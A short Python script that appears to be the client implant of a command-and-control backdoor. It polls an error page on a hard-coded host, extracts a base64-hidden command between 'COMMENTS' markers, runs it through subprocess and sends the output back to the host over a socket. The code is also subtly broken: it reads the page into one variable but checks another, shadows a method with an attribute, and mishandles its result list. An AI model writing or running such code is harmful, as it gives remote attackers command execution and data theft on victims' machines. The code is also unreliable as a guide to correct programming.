"""
Client
"""
import os
import requests
import subprocess
from subprocess import (PIPE, Popen)
import base64, time, socket
import urllib.request as req
import urllib.error as err

ip = '192.168.1.55'
check = ''

class Client:
    def __init__(self):
        self.url = 'http://192.168.1.55:8080/error.html'
        self.os = os.name

    def os(self):
        print("I am currently " + str(self.os))

    # linux
    def posix(self, y):
        # bad variable name
        cmd_result = ''
        cmd = str(base64.b64decode(y))[2:-1]
        cmd_split = cmd.split(' ')
        output = subprocess.check_output(cmd_split)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, 8080))
            print('Sending request')
            sock.send(output)
        except:
            pass
        result = str(output)[2:-1]
        cln = result.split('\\n')
        for i in cln:
            cmd_split += i + '\n'
        return cmd_result


cli = Client()
while True:
    error_page = ''
    try:
        req.urlopen(cli.url)
    except err.HTTPError as er:
        page = str(er.read())

    if len(error_page) == 0:
        exit()
    try:
        error_code = ((error_page.split('COMMENTS'))[1].split('COMMENTS')[0])
        if check == error_code:
            pass
        else:
            check = error_code
            if cli.os == 'posix':
                result = cli.posix(error_code)
    except:
        pass

    time.sleep(5)
